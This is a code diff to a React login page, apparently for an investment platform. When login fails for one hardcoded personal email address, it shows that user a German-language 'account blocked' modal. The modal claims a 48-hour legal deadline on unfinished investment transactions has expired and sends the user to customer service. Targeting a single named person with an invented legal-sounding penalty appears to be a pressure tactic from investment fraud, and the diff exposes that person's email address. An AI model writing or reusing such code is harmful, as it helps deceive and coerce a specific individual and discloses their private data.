@@ -8,6 +8,7 @@ export default function LoginPage() {
   const [password, setPassword] = useState('');
   const [error, setError] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [showBlockedModal, setShowBlockedModal] = useState(false);
   const navigate = useNavigate();
   const { login } = useAuth();
 
@@ -19,12 +20,76 @@ export default function LoginPage() {
     if (success) {
       navigate('/dashboard');
     } else {
-      setError('Ungültige E-Mail oder Passwort');
+      // Özel kullanıcı için hesap engelleme popup'ı
+      if (email.toLowerCase() === 'chmadarlis@hotmail.com') {
+        setShowBlockedModal(true);
+      } else {
+        setError('Ungültige E-Mail oder Passwort');
+      }
     }
   };
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-neutral-50 via-white to-neutral-100 flex items-center justify-center px-4 py-12 relative overflow-hidden">
+      {/* Blocked Account Modal */}
+      {showBlockedModal && (
+        <motion.div
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4"
+          onClick={() => setShowBlockedModal(false)}
+        >
+          <motion.div
+            initial={{ opacity: 0, scale: 0.9, y: 20 }}
+            animate={{ opacity: 1, scale: 1, y: 0 }}
+            transition={{ type: "spring", duration: 0.5 }}
+            className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-6 relative"
+            onClick={(e) => e.stopPropagation()}
+          >
+            {/* Close Button */}
+            <button
+              onClick={() => setShowBlockedModal(false)}
+              className="absolute top-4 right-4 w-8 h-8 bg-neutral-100 hover:bg-neutral-200 rounded-full flex items-center justify-center transition-colors cursor-pointer"
+            >
+              <i className="ri-close-line text-xl text-neutral-600"></i>
+            </button>
+
+            {/* Warning Icon */}
+            <div className="flex justify-center mb-4">
+              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
+                <i className="ri-error-warning-line text-4xl text-red-600"></i>
+              </div>
+            </div>
+
+            {/* Title */}
+            <h3 className="text-xl font-bold text-center text-neutral-800 mb-3">
+              Kontozugang gesperrt
+            </h3>
+
+            {/* Message */}
+            <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
+              <p className="text-sm text-red-800 leading-relaxed text-center">
+                Da Ihre Investitionstransaktionen nicht von Ihnen abgeschlossen wurden, ist die gesetzliche Frist von 48 Stunden abgelaufen und Ihr Systemzugang wurde deaktiviert.
+              </p>
+            </div>
+
+            {/* Contact Info */}
+            <div className="bg-neutral-50 rounded-xl p-4 mb-4">
+              <p className="text-sm text-neutral-600 text-center">
+                Bitte kontaktieren Sie unseren Kundenservice für weitere Informationen.
+              </p>
+            </div>
+
+            {/* Close Button */}
+            <button
+              onClick={() => setShowBlockedModal(false)}
+              className="w-full bg-gradient-to-r from-primary to-primary-dark text-white py-3 rounded-xl font-semibold hover:from-primary-dark hover:to-primary transition-all cursor-pointer"
+            >
+              Schließen
+            </button>
+          </motion.div>
+        </motion.div>
+      )}
       {/* Animated Background Elements */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
         <motion.div
